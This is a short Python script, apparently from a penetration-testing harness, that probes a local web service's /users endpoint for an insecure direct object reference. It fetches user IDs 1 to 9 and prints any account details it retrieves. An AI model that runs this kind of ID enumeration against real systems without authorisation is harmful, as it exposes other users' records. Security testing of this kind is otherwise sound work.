import requests

# Target URL and endpoint to test
url = "http://192.168.2.69:3000/users"

def check_idor():
    # Start with the original user ID as a reference
    original_user_id = 1
    
    # Try with the original user ID
    response = requests.get(f"{url}/{original_user_id}")
    
    if 'id=1&username=admin' in response.text:
        print("RESULT: SUCCESS - Original user details are publicly accessible.")
        print(f"Response content: {response.text[:200]}...")  # Print first 200 chars as evidence
    else:
        for i in range(2, 10):  # Test with IDs 2 to 9 (you may need to adjust the range based on your target)
            response = requests.get(f"{url}/{i}")
            
            if 'id=' in response.text and 'username=' in response.text:
                print("RESULT: SUCCESS - IDOR vulnerability detected.")
                print(f"Response content: {response.text[:200]}...")  # Print first 200 chars as evidence
                return
        
        print("RESULT: NO_SIGNAL")

check_idor()